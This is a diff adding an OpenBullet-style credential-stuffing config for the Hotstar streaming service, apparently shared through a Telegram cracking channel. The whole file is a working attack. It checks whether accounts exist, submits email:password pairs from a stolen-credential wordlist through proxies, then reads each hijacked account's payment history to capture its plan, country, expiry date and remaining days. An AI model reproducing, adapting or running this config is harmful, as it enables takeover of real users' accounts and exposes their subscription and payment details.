@@ -1,0 +1,122 @@
+[SETTINGS]
+{
+  "Name": "HotStar",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-13T23:27:32.7037173+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Capture | Move Free To Custom | CPM Rate: 100-1000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var g1 = uuidv4();
+END SCRIPT -> VARS "did"
+
+#CheckMail REQUEST PUT "https://api.hotstar.com/in/aadhar/v2/web/in/user/exists" 
+  CONTENT "{\"userData\":{\"username\":\"<USER>\",\"usertype\":\"email\",\"deviceId\":\"<did>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.hotstar.com" 
+  HEADER "origin: https://www.hotstar.com" 
+  HEADER "referer: https://www.hotstar.com/in" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"exists\":false," 
+  KEYCHAIN Success OR 
+    KEY "\"usertype\":\"email\"}" 
+    KEY "exists\":true" 
+  KEYCHAIN Ban OR 
+    KEY "An error occurred while processing your request" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "\"usertype\":\"facebook\"" 
+    KEY "\"usertype\":\"phone\"" 
+
+#Post REQUEST POST "https://api.hotstar.com/in/aadhar/v2/web/in/user/login" 
+  CONTENT "{\"isProfileRequired\":false,\"userData\":{\"deviceId\":\"<did>\",\"pId\":\"\",\"password\":\"<PASS>\",\"username\":\"<USER>\",\"usertype\":\"email\"},\"verification\":{}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.hotstar.com" 
+  HEADER "origin: https://www.hotstar.com" 
+  HEADER "referer: https://www.hotstar.com/in" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errorCode\":\"" 
+    KEY "UNAUTHORIZED" 
+  KEYCHAIN Success OR 
+    KEY "userIdentity\":\"" 
+    KEY "message\":\"Login Success\"" 
+
+#Token PARSE "<SOURCE>" JSON "userIdentity" -> VAR "Token" 
+
+#GetCap REQUEST GET "https://api.hotstar.com/in/gringotts/v2/web/in/payment/history" 
+  
+  HEADER "Host: api.hotstar.com" 
+  HEADER "userId: <Token>" 
+  HEADER "origin: https://www.hotstar.com" 
+  HEADER "referer: https://www.hotstar.com/in" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+
+#country PARSE "<SOURCE>" JSON "country" -> CAP "country" 
+
+#Subscription_Plan PARSE "<SOURCE>" LR "packTitle\":\"" "\"," -> CAP "Subscription Plan" 
+
+#Expiry_Date PARSE "<SOURCE>" LR "expiry\":\"" "T" -> CAP "Expiry Date" "" " " 
+
+#CU FUNCTION CurrentUnixTime -> VAR "CU" 
+
+#CN FUNCTION DateToUnixTime "yyyy-MM-dd" "<Expiry Date>" -> VAR "CN" 
+
+#CCC FUNCTION Compute "(<CN>-<CU>)/86400" -> VAR "CCC" 
+
+#Remaining_Days FUNCTION Round "<CCC>" -> CAP "Remaining Days" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"description\":{\"activeSubs\":[]" 
+
+#CC FUNCTION Constant " T.me/BruteForce" -> CAP " Telegram Channel:" 
+
